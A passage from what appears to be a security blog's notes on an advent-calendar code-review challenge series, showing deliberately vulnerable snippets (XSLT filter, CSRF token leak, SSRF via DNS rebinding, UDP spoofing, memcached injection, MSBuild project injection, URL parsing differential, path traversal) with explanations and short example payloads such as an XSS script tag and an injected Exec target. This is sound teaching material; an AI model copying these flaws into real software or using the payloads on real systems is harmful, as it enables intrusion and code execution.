                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;

    &lt;xsl:output method="html" /&gt;

    &lt;!-- Allow the following tags: &lt;b&gt;, &lt;i&gt; and &lt;u&gt; --&gt;

    &lt;xsl:template match="//b | //i | //u"&gt;

        &lt;xsl:element name="{local-name()}"&gt;

            &lt;xsl:value-of select="."/&gt;

        &lt;/xsl:element&gt;

    &lt;/xsl:template&gt;

    &lt;!-- Allow links to https://example.com --&gt;

    &lt;xsl:template match="//*[@href]"&gt;

        &lt;xsl:element name="{local-name()}"&gt;

            &lt;xsl:attribute name="href"&gt;

                &lt;xsl:choose&gt;

                    &lt;xsl:when test="starts-with(@href, 'https://example.com/')"&gt;

                        &lt;xsl:value-of select="@href"/&gt;

                    &lt;/xsl:when&gt;

                    &lt;xsl:otherwise&gt;/&lt;/xsl:otherwise&gt;

                &lt;/xsl:choose&gt;

            &lt;/xsl:attribute&gt;

            &lt;xsl:value-of select="."/&gt;

        &lt;/xsl:element&gt;

    &lt;/xsl:template&gt;

&lt;/xsl:stylesheet&gt;
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>User comments are converted to HTML using an XSLT template.</li>
  <li>The XSLT filters HTML tags to prevent XSS.</li>
  <li>Allowed tags: <code class="language-plaintext highlighter-rouge">&lt;b&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;i&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;u&gt;</code>, and links to <code class="language-plaintext highlighter-rouge">https://example.org</code>.</li>
  <li>Links are allowed based on the <code class="language-plaintext highlighter-rouge">href</code> attribute, without tag name restriction.</li>
  <li>This allows malicious script injection: <code class="language-plaintext highlighter-rouge">&lt;script href="/"&gt;alert(document.domain);&lt;/script&gt;</code>.</li>
</ul>

<h3 id="day-18---javascript"><span class="mr-2">Day 18 - JavaScript</span><a href="#day-18---javascript" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre></td><td class="rouge-code"><pre>const csrfProtect = require('csurf')({ cookie: true });

app.use(session({

    secret: process.env.SECRET,

    cookie: {

        secure: true,

        sameSite: 'none',

    },

}));


app.post('/upload', parseForm, csrfProtect, async (req, res) =&gt; {

    const f = req.files.template;

    if (path.extname(f.name) !== '.txt') {

        return res.status(400).send();

    }

    const id = uuid.v4();

    await f.mv(`public/uploads/${id}`);

    return res.json({id});

});


app.get('/exportPDF', csrfProtect, async (req, res) =&gt; {

    if (!req.query.id) {

        return res.status(400).send();

    }

    const id = path.basename(req.query.id);

    const dst = `public/export/${id}.pdf`;

    const f = buildForm(`public/uploads/${id}`).replaceAll('{csrf_token}', req.csrfToken());

    await fs.writeFile(dst, f);

    return res.send(`&lt;a href="${escape(dst)}"&gt;Your PDF!&lt;a&gt;`);

});

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The goal is to bypass CSRF protection and attack any endpoint.</li>
  <li>The <code class="language-plaintext highlighter-rouge">/exportPDF</code> endpoint exports text files as PDF forms.</li>
  <li>CSRF tokens are embedded in exported PDFs by replacing <code class="language-plaintext highlighter-rouge">{csrf_token}</code>.</li>
  <li>CSRF middleware doesn‚Äôt protect GET requests, making <code class="language-plaintext highlighter-rouge">/exportPDF</code> vulnerable to CSRF.</li>
  <li>Attackers need the file ID to trigger the export.</li>
  <li>Attackers can upload files and trick other users into exporting them.</li>
  <li>Exported PDFs contain the victim‚Äôs CSRF token.</li>
  <li>Attackers can download the PDF, extract the token, and launch CSRF attacks on the victim‚Äôs behalf, performing privileged actions.</li>
</ul>

<h3 id="day-19---python"><span class="mr-2">Day 19 - Python</span><a href="#day-19---python" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre>def is_their_service_broken(url: str) -&gt; bool:

    try:

        host = requests.utils.urlparse(url).hostname

        res = socket.gethostbyname(host)

    except socket.gaierror:

        return False

    return not ipaddress.ip_address(res).is_private


@app.route('/avatar/&lt;string:avatar&gt;')

def fetch_avatar(avatar: str) -&gt; Response:

    avatar = f'http://unstable-avatar-service.tld{avatar}'

    # This service is still in development and their DNS sometimes

    # point to their own internal network, make sure it's OK

    if not is_their_service_broken(avatar): 

        hash = md5(avatar.encode("ascii")).hexdigest()

        avatar = f'http://www.gravatar.com/avatar/{hash}'

    res = requests.get(avatar, stream=True, timeout=1)

    return make_response(

        stream_with_context(res),

        res.status_code,

        {'Content-Type': 'image/png'}

    )

</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li>New feature introduces a Server-Side Request Forgery (SSRF) vulnerability.</li>
  <li>Validation function blocks requests to private IPs, but has a race condition.</li>
  <li>
    <ol>
      <li>DNS lookup resolves hostname to public IP (accepted by validation).</li>
    </ol>
  </li>
  <li>
    <ol>
      <li><code class="language-plaintext highlighter-rouge">request.get()</code> sends another DNS request (potential delay).</li>
    </ol>
  </li>
  <li>
    <ol>
      <li>During this delay, attacker can change IP to a private one (internal service).</li>
    </ol>
  </li>
  <li>Attacker exploits this timing gap by manipulating DNS records.</li>
  <li>Example payload: <code class="language-plaintext highlighter-rouge">http://challenge/avatar/:x@0a004a8c.01010101.rbndr.us:1234</code></li>
  <li>This tricks the server into sending a request to the attacker-controlled internal service (10.0.74.140:1234).</li>
</ul>

<p><em>Challenge based on https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/</em></p>

<h3 id="day-20---csharp"><span class="mr-2">Day 20 - CSharp</span><a href="#day-20---csharp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre>// Start log server 

Socket socket = new Socket(

    AddressFamily.InterNetwork,

    SocketType.Dgram,

    ProtocolType.Udp);

socket.SetSocketOption(

    SocketOptionLevel.IP,

    SocketOptionName.ReuseAddress,

    true);

socket.Bind(new IPEndPoint(IPAddress.Parse("0.0.0.0"), 1337));


const int bufSize = 1024;

byte[] buffer = new byte[bufSize];

EndPoint epFrom = new IPEndPoint(IPAddress.Any, 0);

AsyncCallback recv = null;

socket.BeginReceiveFrom(buffer, 0, bufSize, SocketFlags.None, ref epFrom, recv = (ar) =&gt;

{

    int receivedBytes = socket.EndReceiveFrom(ar, ref epFrom);

    IPEndPoint src = epFrom as IPEndPoint;

    if (IsInRange(src.Address, "10.13.37.0/24"))

    {

        ConsumeLogMessage(epFrom, buffer, receivedBytes);

    }

    socket.BeginReceiveFrom(buffer, 0, bufSize, SocketFlags.None, ref epFrom, recv, buffer);

}, buffer);
</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li>UDP socket is opened on port 1337 to receive log messages.</li>
  <li>A callback function processes incoming UDP packets.</li>
  <li>Packet validation checks if the source IP is within the 10.13.37.0/24 range.</li>
  <li>UDP lacks strong security mechanisms like TCP‚Äôs handshake.</li>
  <li>Attackers can spoof source IP addresses using tools like Scapy.</li>
  <li>While internet ISPs often filter spoofed packets, some shady hosting providers allow it.</li>
  <li>IP-based access control should consider this vulnerability.</li>
</ul>

<h3 id="day-21---java"><span class="mr-2">Day 21 - Java</span><a href="#day-21---java" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre></td><td class="rouge-code"><pre>MemcachedConnector mcc = new MemcachedConnector("memcached", 11211);

mcc.set("welcome_en", "Hi there!");

mcc.set("welcome_de", "Hallo!");

mcc.set("welcome_fr", "Bonjour!");

mcc.set("auth_backend", "http://192.168.64.2:8000/");


HttpServer srv = HttpServer.create(new InetSocketAddress(9000), 0);


srv.createContext("/", (HttpExchange he) -&gt; {

    String lang = "en";

    if (he.getRequestURI().getQuery() != null) {

        for (String param : he.getRequestURI().getQuery().split("&amp;")) {

            String[] entry = param.split("=");

            if (entry[0].equals("lang")) lang = entry[1];

        }

    }

    String welcomeMessage = mcc.get("welcome_" + lang);

    Main.response(he, 200, welcomeMessage);

});


srv.createContext("/login", (HttpExchange he) -&gt; {

    try {

        JSONParser jsonParser = new JSONParser();

        JSONObject jsonObject = (JSONObject)jsonParser.parse(new InputStreamReader(he.getRequestBody(), "UTF-8"));

        String authBackend = mcc.get("auth_backend");

        String body = "username=" + jsonObject.get("username") + "&amp;password=" + jsonObject.get("password");

        HttpClient httpClient = HttpClient.newHttpClient();

        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(authBackend))

                                     .POST(HttpRequest.BodyPublishers.ofString(body))

                                     .headers("Content-Type", "application/x-www-form-urlencoded").build();

        HttpResponse&lt;String&gt; resp = httpClient.send(req, HttpResponse.BodyHandlers.ofString());

        if (resp.statusCode() == 200) {

            Main.response(he, 200, "Welcome!\n");

            return;

        }

    } catch (Exception exp) { }

    Main.response(he, 403, "Login failed!\n");

});


srv.start();
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The application uses memcached to store localized welcome messages.</li>
  <li>The <code class="language-plaintext highlighter-rouge">lang</code> query parameter is directly inserted into the memcached query.</li>
  <li>By injecting newline characters (<code class="language-plaintext highlighter-rouge">\r\n</code>), attackers can append additional memcached commands.</li>
  <li>Attackers can manipulate the <code class="language-plaintext highlighter-rouge">auth_backend</code> key to redirect user credentials to a malicious server.</li>
  <li>This vulnerability is similar to a real-world Zimbra vulnerability.</li>
</ul>

<p><em>Challenge based on https://blog.sonarsource.com/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/</em></p>

<h3 id="day-22---csharp"><span class="mr-2">Day 22 - CSharp</span><a href="#day-22---csharp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td><td class="rouge-code"><pre>[HttpPost]

public string DummyBuild()

{

    // note: users can create files and subdirs in their project dir

    string src = GetCurrentUserProjectDir();

    var sources = Directory.GetFiles(src, "*.cs", SearchOption.AllDirectories)

                           .ToList()

                           .Select(x =&gt; @$"&lt;None Include=""{x}"" /&gt;");


    string tmpDir = CreateTmpDir();

    System.IO.File.WriteAllText(Path.Combine(tmpDir, "app.csproj"), $@"

&lt;Project Sdk=""Microsoft.NET.Sdk""&gt;

&lt;PropertyGroup&gt;&lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;&lt;/PropertyGroup&gt;

&lt;ItemGroup&gt;{string.Join(Environment.NewLine, sources)}&lt;/ItemGroup&gt;

&lt;/Project&gt;");


    var process = new System.Diagnostics.Process();

    process.StartInfo = new System.Diagnostics.ProcessStartInfo

    {

        WorkingDirectory = tmpDir,

        FileName = "dotnet",

        Arguments = "build",

        RedirectStandardOutput = true,

    };

    process.Start();

    var output = process.StandardOutput.ReadToEnd();

    process.WaitForExit();


    CleanUp(tmpDir);

    return output;

}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">DummyBuild()</code> function creates an XML project file based on user-provided file paths.</li>
  <li>These paths are inserted into the template without escaping special characters (‚Äú, &lt;, &gt;).</li>
  <li>Attackers can craft paths containing these characters to inject XML elements.</li>
  <li>The generated file is used as a .NET project file with <code class="language-plaintext highlighter-rouge">dotnet build</code>.</li>
  <li>An attacker can create a <code class="language-plaintext highlighter-rouge">&lt;Target&gt;</code> with an <code class="language-plaintext highlighter-rouge">&lt;Exec&gt;</code> command for arbitrary code execution.</li>
  <li>Example path: <code class="language-plaintext highlighter-rouge">"/&gt;&lt;/ItemGroup&gt;&lt;Target Name="Pwn" BeforeTargets="Build"&gt;&lt;Exec Command="id"/&gt;&lt;/Target&gt;&lt;ItemGroup&gt;&lt;None Include="/tmp/foo.cs</code></li>
  <li>This creates a malicious project file structure with an embedded ‚Äúid‚Äù command.</li>
  <li><code class="language-plaintext highlighter-rouge">dotnet build</code> executes the attacker-defined ‚ÄúPwn‚Äù target before building, running the ‚Äúid‚Äù command.</li>
</ul>

<h3 id="day-23---c"><span class="mr-2">Day 23 - C</span><a href="#day-23---c" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td><td class="rouge-code"><pre>// I found this URL parser on stackoverflow, it should be good enough

bool validate_domain(const char *url) {

    char domain[100];

    int port = 80;

    sscanf(url, "https://%99[^:]:%99d/", domain, &amp;port);

    return strcmp("internal.service", domain) == 0;

}


int main(int argc, char **argv) {

  // [...]

  const char *url = argv[1];


  if (!validate_domain(url)) {

    printf("validate_domain failed\n");

    return 1;

  }


  if ((curl = curl_easy_init())) {

    curl_easy_setopt(curl, CURLOPT_URL, url);

    res = curl_easy_perform(curl); 

    switch(res) {

    case CURLE_OK:

        printf("All good!\n");

        break;

    default:

        printf("Nope :(\n");

        break;

    }

  }

  // [...]

}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">validate_domain()</code> function uses a simplified URL parsing approach.</li>
  <li>This approach differs from standards like RFC 2396 and RFC 3986.</li>
  <li>Libraries like libcurl implement more comprehensive URL parsing.</li>
  <li>This discrepancy can lead to different interpretations of the same URL.</li>
  <li>This is known as a URL parsing differential.</li>
  <li>Attackers can exploit this by crafting malicious URLs that target unintended hosts.</li>
  <li>Example: <code class="language-plaintext highlighter-rouge">https://internal.service:@very-sensitive-internal.service/</code></li>
</ul>

<h3 id="day-24---php"><span class="mr-2">Day 24 - PHP</span><a href="#day-24---php" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre>define('UPLOAD_FOLDER',

       sys_get_temp_dir().DIRECTORY_SEPARATOR.'uploads'.DIRECTORY_SEPARATOR);


function validateFilePath($fpath) {

  // Prevent path traversal

  if (str_contains($fpath, '..'.DIRECTORY_SEPARATOR)) {

    http_response_code(403);

    die('invalid path!');

  }

}


function uploadFile($src, $dest) {

  $path = dirname($dest);

  if (!file_exists($path)) {

    mkdir($path, 0755, true);

  }

  move_uploaded_file($src, $dest);

}


function normalizeFilePath($fpath) {

  if (strpos($_SERVER['HTTP_USER_AGENT'], 'Windows')) {

    return str_replace('\\', '/', $fpath);

  }

  return $fpath;

}


$src  = $_FILES['file']['tmp_name'];

$dest = UPLOAD_FOLDER.$_FILES['file']['full_path'];

validateFilePath($dest);

uploadFile($src, normalizeFilePath($dest));

echo 'file uploaded!';
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The application allows users to upload arbitrary files.</li>
  <li>The destination path is constructed by concatenating the base path with the user-provided filename.</li>
  <li>A basic check is done to prevent <code class="language-plaintext highlighter-rouge">../</code> in the filename to avoid path traversal.</li>
  <li>However, the normalization process converts backslashes (<code class="language-plaintext highlighter-rouge">\</code>) to forward slashes (<code class="language-plaintext highlighter-rouge">/</code>) on Windows systems.</li>
  <li>Attackers can exploit this by using <code class="language-plaintext highlighter-rouge">\..</code> in the filename and setting a Windows User-Agent.</li>
  <li>This bypasses the <code class="language-plaintext highlighter-rouge">../</code> check and allows path traversal to arbitrary locations.</li>
  <li>An attacker can upload a malicious PHP file to the web root, enabling remote code execution.</li>
</ul>

<p><em>This challenge is based from https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/</em></p>


</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/capture-the-flag/'>capture the flag</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/ctf/"
          class="post-tag no-text-decoration" >ctf</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://x.com/snoopysecurity?lang=en-GB" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://x.com/snoopysecurity?lang=en-GB" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/in/sam-sanoop-b80535252/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/ctf/">ctf</a>
    
      
      <a class="post-tag" href="/tags/php-deserialization/">php deserialization</a>
    
      
      <a class="post-tag" href="/tags/yaml/">yaml</a>
    
      
      <a class="post-tag" href="/tags/exploit-education/">exploit education</a>
    
      
      <a class="post-tag" href="/tags/facebook-ctf/">facebook ctf</a>
    
      
      <a class="post-tag" href="/tags/zip-slip/">zip slip</a>
    
      
      <a class="post-tag" href="/tags/code-security-advent-calendar/">code security advent calendar</a>
    
      
      <a class="post-tag" href="/tags/domgoat/">domgoat</a>
    
      
      <a class="post-tag" href="/tags/drozer/">drozer</a>
    
      
      <a class="post-tag" href="/tags/ghost-xss/">ghost xss</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/ripstech_2017_security_calendar/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1521833152"
    data-df="ll"
    >
  Mar 24, 2018
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>RipsTech PHP Security Calendar 2017 Notes</h3>
            <div class="text-muted small">
              <p>
                





                Notes related to RipsTech PHP Security Calendar 2017 which aren‚Äôt accessible anymore.

Challenge 1 - Wishlist

class Challenge {
    const UPLOAD_DIRECTORY = &#39;./solutions/&#39;;
    private $file;
    ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/ripstech-java-advent-calendar/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1578425152"
    data-df="ll"
    >
  Jan  8, 2020
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>RipsTech Java Security Calendar 2019 Notes</h3>
            <div class="text-muted small">
              <p>
                





                Notes related to RipsTech PHP Security Calendar 2019 which aren‚Äôt accessible anymore.

Challenge 1 - Candy Cane

import org.jdom2.Content;
import org.jdom2.Document;
import org.jdom2.JDOMException;...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/code-advent-2021-security-challenges/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1641065152"
    data-df="ll"
    >
  Jan  2, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SonarSource CodeAdvent Security Calendar 2021 Notes</h3>
            <div class="text-muted small">
              <p>
                





                Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2021.

Day 1




  
    Line 13: The code registers a handler for message events and writes the event‚Äôs data directly into the DOM...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/avoiding-smtp-injection/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Avoiding SMTP Injection: A Whitebox primer</p>
  </a>
  

  
  <a href="/posts/lakerta-gandalf-ctf/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>LakeraAI Gandalf LLM CTF Solutions</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
